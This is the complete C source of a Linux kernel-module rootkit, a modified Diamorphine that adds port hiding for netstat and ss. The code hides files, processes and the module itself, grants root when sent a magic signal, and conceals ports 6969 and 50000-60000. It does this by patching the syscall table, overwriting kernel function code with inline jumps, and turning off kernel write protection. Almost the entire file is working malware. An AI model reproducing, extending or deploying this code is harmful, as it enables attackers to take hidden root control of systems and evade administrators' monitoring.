#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <linux/fs.h>
#include <linux/netlink.h>
#include <uapi/linux/inet_diag.h>
#include <linux/inet_diag.h>
#include <linux/vmalloc.h>
#include <linux/set_memory.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "diamorphine.h"

struct inet_diag_ops;

static inline void protect_memory(void);
static inline void unprotect_memory(void);

static struct seq_operations *tcp4_seq_ops = NULL;
static struct seq_operations *tcp6_seq_ops = NULL;
static struct seq_operations *udp4_seq_ops = NULL;
static struct seq_operations *udp6_seq_ops = NULL;

static int (*orig_tcp4_show)(struct seq_file *m, void *v) = NULL;
static int (*orig_tcp6_show)(struct seq_file *m, void *v) = NULL;
static int (*orig_udp4_show)(struct seq_file *m, void *v) = NULL;
static int (*orig_udp6_show)(struct seq_file *m, void *v) = NULL;

static void *inet_diag_fill_one_addr = NULL;
static void *trampoline = NULL;
static struct page *trampoline_page = NULL;
static unsigned char saved_bytes[5] = {0};

static int (*orig_inet_diag_fill_one)(struct sk_buff *,
                                      const struct inet_diag_req_v2 *,
                                      struct sock *,
                                      struct netlink_callback *,
                                      const struct inet_diag_ops *) = NULL;

static int port_hide_enabled = 0;

static inline int is_port_hidden(unsigned short port) {
    if (port == 6969) return 1;
    if (port >= 50000 && port <= 60000) return 1;
    return 0;
}

static int hacked_tcp4_seq_show(struct seq_file *m, void *v) {
    if (!port_hide_enabled || v == SEQ_START_TOKEN)
        return orig_tcp4_show(m, v);
    struct sock *sk = (struct sock *)v;
    unsigned short port = ntohs(inet_sk(sk)->inet_sport);
    if (is_port_hidden(port))
        return 0;
    return orig_tcp4_show(m, v);
}

static int hacked_tcp6_seq_show(struct seq_file *m, void *v) {
    if (!port_hide_enabled || v == SEQ_START_TOKEN)
        return orig_tcp6_show(m, v);
    struct sock *sk = (struct sock *)v;
    unsigned short port = ntohs(inet_sk(sk)->inet_sport);
    if (is_port_hidden(port))
        return 0;
    return orig_tcp6_show(m, v);
}

static int hacked_udp4_seq_show(struct seq_file *m, void *v) {
    if (!port_hide_enabled || v == SEQ_START_TOKEN)
        return orig_udp4_show(m, v);
    struct sock *sk = (struct sock *)v;
    unsigned short port = ntohs(inet_sk(sk)->inet_sport);
    if (is_port_hidden(port))
        return 0;
    return orig_udp4_show(m, v);
}

static int hacked_udp6_seq_show(struct seq_file *m, void *v) {
    if (!port_hide_enabled || v == SEQ_START_TOKEN)
        return orig_udp6_show(m, v);
    struct sock *sk = (struct sock *)v;
    unsigned short port = ntohs(inet_sk(sk)->inet_sport);
    if (is_port_hidden(port))
        return 0;
    return orig_udp6_show(m, v);
}

static int hacked_inet_diag_fill_one(struct sk_buff *skb,
                                     const struct inet_diag_req_v2 *req,
                                     struct sock *sk,
                                     struct netlink_callback *cb,
                                     const struct inet_diag_ops *ops)
{
    if (!port_hide_enabled)
        return orig_inet_diag_fill_one(skb, req, sk, cb, ops);

    unsigned short port = ntohs(inet_sk(sk)->inet_sport);
    if (is_port_hidden(port))
        return 0;

    return orig_inet_diag_fill_one(skb, req, sk, cb, ops);
}

static void *create_trampoline(void *target) {
    struct page *page = alloc_page(GFP_KERNEL);
    if (!page)
        return NULL;

    void *tramp = vmap(&page, 1, VM_MAP, PAGE_KERNEL_EXEC);
    if (!tramp) {
        __free_page(page);
        return NULL;
    }

    trampoline_page = page;

    memcpy(tramp, target, 5);

    unsigned char jmp[5] = {0xe9, 0x00, 0x00, 0x00, 0x00};
    int32_t offset = (int32_t)((uintptr_t)target + 5 - ((uintptr_t)tramp + 5) - 5);
    memcpy(jmp + 1, &offset, 4);
    memcpy((unsigned char *)tramp + 5, jmp, 5);

    return tramp;
}

static void hook_inet_diag_fill_one(void) {
    inet_diag_fill_one_addr = (void *)resolve_sym("inet_diag_fill_one");
    if (!inet_diag_fill_one_addr) {
        printk(KERN_WARNING "diamorphine: inet_diag_fill_one not found. ss hiding disabled.\n");
        return;
    }

    trampoline = create_trampoline(inet_diag_fill_one_addr);
    if (!trampoline) {
        printk(KERN_WARNING "diamorphine: Trampoline creation failed. ss hiding disabled.\n");
        return;
    }

    orig_inet_diag_fill_one = (void *)trampoline;

    unprotect_memory();
    memcpy(saved_bytes, inet_diag_fill_one_addr, 5);

    unsigned char jmp[5] = {0xe9, 0x00, 0x00, 0x00, 0x00};
    int32_t offset = (int32_t)((uintptr_t)hacked_inet_diag_fill_one
                                - (uintptr_t)inet_diag_fill_one_addr - 5);
    memcpy(jmp + 1, &offset, 4);
    memcpy(inet_diag_fill_one_addr, jmp, 5);
    protect_memory();

    printk(KERN_INFO "diamorphine: inet_diag_fill_one hooked successfully (ss).\n");
}

static void unhook_inet_diag_fill_one(void) {
    if (!inet_diag_fill_one_addr)
        return;

    unprotect_memory();
    memcpy(inet_diag_fill_one_addr, saved_bytes, 5);
    protect_memory();

    if (trampoline) {
        vunmap(trampoline);
        if (trampoline_page)
            __free_page(trampoline_page);
        trampoline = NULL;
        trampoline_page = NULL;
    }
    printk(KERN_INFO "diamorphine: inet_diag_fill_one unhooked.\n");
}

static void enable_port_hide(void) {
    if (!port_hide_enabled) {
        port_hide_enabled = 1;
        printk(KERN_INFO "diamorphine: Port hiding ENABLED (6969, 50000-60000)\n");
    }
}

static void disable_port_hide(void) {
    if (port_hide_enabled) {
        port_hide_enabled = 0;
        printk(KERN_INFO "diamorphine: Port hiding DISABLED\n");
    }
}

static void toggle_port_hide(void) {
    if (port_hide_enabled)
        disable_port_hide();
    else
        enable_port_hide();
}

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
                            phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif

static unsigned long *__sys_call_table;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
void *sys_call;
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
    static t_syscall orig_getdents;
    static t_syscall orig_getdents64;
    static t_syscall orig_kill;
#else
    typedef asmlinkage long (*orig_getdents_t)(unsigned int,
            struct linux_dirent *, unsigned int);
    typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
        struct linux_dirent64 *, unsigned int);
    typedef asmlinkage long (*orig_kill_t)(pid_t, int);
    orig_getdents_t orig_getdents;
    orig_getdents64_t orig_getdents64;
    orig_kill_t orig_kill;
#endif

#ifdef KPROBE_LOOKUP
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
#endif

unsigned long resolve_sym(char *symbol)
{
#ifdef KPROBE_LOOKUP
    kallsyms_lookup_name_t kallsyms_lookup_name;
    if (kallsyms_lookup_name_ == NULL) {
        register_kprobe(&kp);
        kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
    }
    kallsyms_lookup_name = kallsyms_lookup_name_;
#endif
    return kallsyms_lookup_name(symbol);
}

unsigned long *get_syscall_table_bf(void)
{
    unsigned long *syscall_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
    syscall_table = (unsigned long *)resolve_sym("sys_call_table");
    return syscall_table;
#else
    unsigned long int i;
    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
#endif
}

struct task_struct *find_task(pid_t pid)
{
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}

int is_invisible(pid_t pid)
{
    struct task_struct *task;
    if (!pid) return 0;
    task = find_task(pid);
    if (!task) return 0;
    return (task->flags & PF_INVISIBLE) ? 1 : 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    int fd = (int) pt_regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    int fd = (int) pt_regs->regs[0];
    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
    int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage long hacked_getdents64(unsigned int fd,
        struct linux_dirent64 __user *dirent, unsigned int count)
{
    int ret = orig_getdents64(fd, dirent, count), err;
#endif
    unsigned short proc = 0, namelen = 0;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0) return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL) return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err) goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;

    while (off < ret) {
        dir = (void *)kdirent + off;
        namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
        if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
        (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
        || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err) goto out;
out:
    kfree(kdirent);
    return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    int fd = (int) pt_regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    int fd = (int) pt_regs->regs[0];
    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
    int ret = orig_getdents(pt_regs), err;
#else
asmlinkage long hacked_getdents(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count)
{
    int ret = orig_getdents(fd, dirent, count), err;
#endif
    unsigned short proc = 0, namelen = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0) return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL) return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err) goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;

    while (off < ret) {
        dir = (void *)kdirent + off;
        namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
        if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
        (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
        || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err) goto out;
out:
    kfree(kdirent);
    return ret;
}

void give_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
    current->uid = current->gid = 0;
    current->euid = current->egid = 0;
    current->suid = current->sgid = 0;
    current->fsuid = current->fsgid = 0;
#else
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL) return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
    && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
    || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
#endif
    commit_creds(newcreds);
#endif
}

static inline void tidy(void)
{
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

void module_show(void)
{
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
}

void module_hide(void)
{
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    pid_t pid = (pid_t) pt_regs->regs[0];
    int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage long hacked_kill(pid_t pid, int sig)
{
#endif
    struct task_struct *task;

    switch (sig) {
        case SIGINVIS:
            if ((task = find_task(pid)) == NULL)
                return -ESRCH;
            task->flags ^= PF_INVISIBLE;
            return 0;
        case SIGSUPER:
            give_root();
            return 0;
        case SIGMODINVIS:
            if (module_hidden) module_show();
            else module_hide();
            return 0;
        case SIGPORTHIDE:
            toggle_port_hide();
            return 0;
        default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
            return orig_kill(pt_regs);
#else
            return orig_kill(pid, sig);
#endif
    }
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}
#endif

static inline void protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0);
#else
    write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
            section_size, PAGE_KERNEL_RO);
#endif
}

static inline void unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0 & ~0x00010000);
#else
    write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
            section_size, PAGE_KERNEL);
#endif
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
void flipswitch_func(void *target_func, void *hacked_func) {
    unsigned char *func_ptr = (unsigned char *)sys_call;
    for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
        if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) {
            int32_t rel = *(int32_t *)(func_ptr + i + 1);
            void *call_addr = (void *)((uintptr_t)sys_call + i + 5 + rel);
            if (call_addr == target_func) {
                int32_t new_rel = (uintptr_t)hacked_func
                                  - ((uintptr_t)sys_call + i + 5);
                memcpy(func_ptr + i + 1, &new_rel, sizeof(new_rel));
                break;
            }
        }
    }
}
#endif

static int __init diamorphine_init(void)
{
    __sys_call_table = get_syscall_table_bf();
    if (!__sys_call_table)
        return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
    start_rodata = (unsigned long)resolve_sym("__start_rodata");
    init_begin = (unsigned long)resolve_sym("__init_begin");
#endif

    module_hide();
    tidy();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    sys_call = (t_syscall)resolve_sym("x64_sys_call");
    if (!sys_call)
        return -1;
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    orig_getdents   = (t_syscall)__sys_call_table[__NR_getdents];
    orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
    orig_kill       = (t_syscall)__sys_call_table[__NR_kill];
#else
    orig_getdents   = (orig_getdents_t)__sys_call_table[__NR_getdents];
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
    orig_kill       = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

    tcp4_seq_ops = (struct seq_operations *)resolve_sym("tcp4_seq_ops");
    tcp6_seq_ops = (struct seq_operations *)resolve_sym("tcp6_seq_ops");
    udp4_seq_ops = (struct seq_operations *)resolve_sym("udp4_seq_ops");
    udp6_seq_ops = (struct seq_operations *)resolve_sym("udp6_seq_ops");

    if (tcp4_seq_ops || tcp6_seq_ops || udp4_seq_ops || udp6_seq_ops) {
        unprotect_memory();

        if (tcp4_seq_ops) {
            orig_tcp4_show = tcp4_seq_ops->show;
            tcp4_seq_ops->show = hacked_tcp4_seq_show;
        }
        if (tcp6_seq_ops) {
            orig_tcp6_show = tcp6_seq_ops->show;
            tcp6_seq_ops->show = hacked_tcp6_seq_show;
        }
        if (udp4_seq_ops) {
            orig_udp4_show = udp4_seq_ops->show;
            udp4_seq_ops->show = hacked_udp4_seq_show;
        }
        if (udp6_seq_ops) {
            orig_udp6_show = udp6_seq_ops->show;
            udp6_seq_ops->show = hacked_udp6_seq_show;
        }

        protect_memory();
        printk(KERN_INFO "diamorphine: ProcFS port hiding hooks installed.\n");
    } else {
        printk(KERN_WARNING "diamorphine: Could not resolve seq_ops. Port hiding disabled for netstat.\n");
    }

    hook_inet_diag_fill_one();

    unprotect_memory();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    flipswitch_func(orig_getdents,   hacked_getdents);
    flipswitch_func(orig_getdents64, hacked_getdents64);
    flipswitch_func(orig_kill,       hacked_kill);
#else
    __sys_call_table[__NR_getdents]   = (unsigned long)hacked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
    __sys_call_table[__NR_kill]       = (unsigned long)hacked_kill;
#endif
    protect_memory();

    return 0;
}

static void __exit diamorphine_cleanup(void)
{
    if (tcp4_seq_ops || tcp6_seq_ops || udp4_seq_ops || udp6_seq_ops) {
        unprotect_memory();

        if (tcp4_seq_ops && orig_tcp4_show)
            tcp4_seq_ops->show = orig_tcp4_show;
        if (tcp6_seq_ops && orig_tcp6_show)
            tcp6_seq_ops->show = orig_tcp6_show;
        if (udp4_seq_ops && orig_udp4_show)
            udp4_seq_ops->show = orig_udp4_show;
        if (udp6_seq_ops && orig_udp6_show)
            udp6_seq_ops->show = orig_udp6_show;

        protect_memory();
        printk(KERN_INFO "diamorphine: ProcFS hooks restored.\n");
    }

    unhook_inet_diag_fill_one();

    unprotect_memory();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    flipswitch_func(hacked_getdents,   orig_getdents);
    flipswitch_func(hacked_getdents64, orig_getdents64);
    flipswitch_func(hacked_kill,       orig_kill);
#else
    __sys_call_table[__NR_getdents]   = (unsigned long)orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
#endif
    protect_memory();
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad (Modified by radtimer)");
MODULE_DESCRIPTION("LKM rootkit with port hiding for both netstat and ss (inline hook)");
